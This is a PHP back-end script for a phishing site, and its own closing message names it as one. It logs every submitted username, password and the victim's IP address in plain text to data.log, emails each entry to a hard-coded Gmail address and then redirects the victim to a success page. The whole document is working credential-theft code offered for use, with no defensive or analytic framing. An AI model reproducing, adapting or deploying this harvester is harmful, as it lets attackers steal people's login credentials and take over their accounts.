<?php
// Enable error reporting for debugging (remove this in production)
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Function to sanitize user input
function sanitize_input($data) {
    return htmlspecialchars(trim($data));
}

// Check if the request is POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Sanitize and retrieve the data
    $username = sanitize_input($_POST['username']);
    $password = sanitize_input($_POST['password']);

    // Get the user's IP address
    $user_ip = $_SERVER['REMOTE_ADDR'];

    // Log the data to a file
    $log_entry = "Date: " . date("Y-m-d H:i:s") . "\n";
    $log_entry .= "IP Address: $user_ip\n";
    $log_entry .= "Username/Email: $username\n";
    $log_entry .= "Password: $password\n\n";
    
    // Write the log to a file
    file_put_contents('data.log', $log_entry, FILE_APPEND);

    // Optionally, send an email notification
    $to = "rajeshkumar8810362760@gmail.com"; // Replace with your email
    $subject = "New Submission Received";
    $headers = "From: no-reply@example.com";
    mail($to, $subject, $log_entry, $headers);

    // Redirect to a success page or display a success message
    header("Location: success.html");
    exit();
} else {
    // Redirect to an success page or show an reminder message
    echo "email/username and password will we send to data.log automatically by php when data is submitted into pishing site .";
}
?>
